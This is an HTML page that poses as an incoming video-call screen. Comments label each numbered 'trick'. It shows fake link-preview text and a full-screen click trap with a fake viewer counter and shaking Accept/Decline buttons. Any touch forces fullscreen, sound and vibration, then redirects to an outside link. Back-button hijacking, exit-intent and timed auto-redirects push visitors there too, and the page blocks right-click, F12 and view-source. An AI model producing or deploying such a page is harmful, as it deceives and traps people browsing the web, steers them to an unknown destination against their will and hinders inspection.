<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <!-- Trick 26, 27: No Cache -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />

    <!-- Trick 1, 2, 3, 4: Link Preview / Thumbnail Tags -->
    <title>Incoming Video Call...</title>
    <meta property="og:title" content="1 New Video Call Request" />
    <meta property="og:description" content="Click to join the private real-time video stream. Connection is encrypted." />
    <!-- Trick 7 (in OG): Provided Image -->
    <meta property="og:image" content="https://github.com/sfdujtrgfirytutr7856856-collab/cxxcv/blob/main/536593C1-F811-4A5F-B2BE-746E943A069F.png?raw=true" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />

    <style>
        /* Trick 5, 11, 17, 18: Premium Dark Theme & No Select */
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #050914; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white; overflow: hidden; user-select: none; -webkit-user-select: none;
        }

        /* Trick 6: Background Blur */
        .bg-blur {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            filter: blur(15px); z-index: 1; opacity: 0.6;
        }

        /* Trick 9, 11: Call Overlay / Click Trap */
        .call-wrapper {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 10; display: flex; flex-direction: column; 
            justify-content: center; align-items: center; cursor: pointer;
        }

        /* Trick 7, 8: Avatar and Pulse */
        .caller-avatar {
            width: 140px; height: 140px; border-radius: 50%;
            background-image: url('https://github.com/sfdujtrgfirytutr7856856-collab/cxxcv/blob/main/536593C1-F811-4A5F-B2BE-746E943A069F.png?raw=true');
            background-size: cover; background-position: center;
            border: 4px solid #00ff66;
            box-shadow: 0 0 20px #00ff66;
            animation: pulse-ring 1.5s infinite;
        }

        .caller-name { font-size: 28px; font-weight: bold; margin-top: 25px; letter-spacing: 1px; }
        .caller-status { font-size: 16px; color: #00ff66; margin-top: 8px; }
        
        /* Trick 23, 24: Trust Badge & Live Dot */
        .trust-badge { margin-top: 15px; font-size: 13px; color: #aaa; display: flex; align-items: center; gap: 5px; }
        .live-dot { width: 8px; height: 8px; background-color: red; border-radius: 50%; animation: blink 1s infinite; }

        /* Trick 10: Shaking Buttons */
        .btn-container { display: flex; gap: 45px; margin-top: 60px; }
        .action-btn {
            width: 85px; height: 85px; border-radius: 50%; border: none; font-weight: bold;
            font-size: 16px; color: white; cursor: pointer; animation: shake-btn 0.5s infinite;
        }
        .btn-green { background-color: #25D366; box-shadow: 0 0 30px rgba(37, 211, 102, 0.6); }
        .btn-red { background-color: #FF3B30; box-shadow: 0 0 30px rgba(255, 59, 48, 0.6); }

        /* Trick 21: Fake Counter */
        .live-counter { position: absolute; bottom: 30px; font-size: 14px; color: #888; }

        /* Keyframes */
        @keyframes pulse-ring {
            0% { box-shadow: 0 0 10px #00ff66; transform: scale(1); }
            50% { box-shadow: 0 0 40px #00ff66; transform: scale(1.05); }
            100% { box-shadow: 0 0 10px #00ff66; transform: scale(1); }
        }
        @keyframes shake-btn {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(-10deg); }
            50% { transform: rotate(0deg); }
            75% { transform: rotate(10deg); }
            100% { transform: rotate(0deg); }
        }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body oncontextmenu="return false;"> <!-- Trick 17: No Right Click -->

    <div class="bg-blur"></div>

    <!-- Trick 12, 28: Audio System -->
    <audio id="callAudio" loop>
        <source src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Phone_ringing.ogg" type="audio/ogg">
    </audio>

    <!-- The Main Trap -->
    <div class="call-wrapper" id="trapArea">
        <div class="caller-avatar"></div>
        <div class="caller-name">Incoming Video Call</div>
        <div class="caller-status">Connecting...</div>
        
        <div class="trust-badge">
            <div class="live-dot"></div> Secure P2P Connection
        </div>

        <div class="btn-container">
            <button class="action-btn btn-red">Decline</button>
            <button class="action-btn btn-green">Accept</button>
        </div>

        <div class="live-counter" id="viewerCount">Online: 1,245</div>
    </div>

    <script>
        // === MAIN SETTINGS ===
        const targetLink = "https://firefone.com/bedjfha"; // Trick 30: Master Redirect Link
        let isActivated = false;

        // Trick 4: Dynamic Tab Title
        const titles = ["Incoming Call...", "(1) Missed Call"];
        let titleIndex = 0;
        setInterval(() => {
            document.title = titles[titleIndex];
            titleIndex = (titleIndex + 1) % titles.length;
        }, 1500);

        // Trick 21: Fake Random Counter
        setInterval(() => {
            let count = Math.floor(Math.random() * (1600 - 1200 + 1)) + 1200;
            document.getElementById('viewerCount').innerText = "Online: " + count.toLocaleString();
        }, 3000);

        // Trick 19: Block F12 and Ctrl+U
        document.onkeydown = function(e) {
            if(event.keyCode == 123) return false;
            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }

        // Trigger Magic on First Touch/Click
        const trapArea = document.getElementById('trapArea');
        trapArea.addEventListener('mousedown', executeMagic);
        trapArea.addEventListener('touchstart', executeMagic);

        function executeMagic() {
            if (!isActivated) {
                isActivated = true;
                
                // Trick 14: Fullscreen Hijack
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen().catch((e) => {});
                }

                // Trick 12, 13: Play Sound and Vibrate
                document.getElementById('callAudio').play().catch(()=>{});
                if (navigator.vibrate) { navigator.vibrate([1000, 500, 1000, 500, 1000]); }

                // Trick 24: Change text to ring
                document.querySelector('.caller-status').innerText = "Ringing...";
                
                // Delay exact redirect slightly so they feel the trap
                setTimeout(() => {
                    fireRedirect();
                }, 300);
            } else {
                // If they click again, redirect instantly
                fireRedirect();
            }
        }

        function fireRedirect() {
            if (navigator.vibrate) { navigator.vibrate(200); }
            window.location.href = targetLink;
        }

        // Trick 15: Back-Button Trap
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
            fireRedirect(); // Send to offer if they try to go back
        };

        // Trick 16: Exit Intent (PC only)
        document.addEventListener("mouseout", function(e) {
            if (e.clientY < 0) { fireRedirect(); }
        });

        // Trick 20: Auto-Redirect Timer (30 seconds)
        setTimeout(() => {
            fireRedirect();
        }, 30000);

    </script>
</body>
</html>
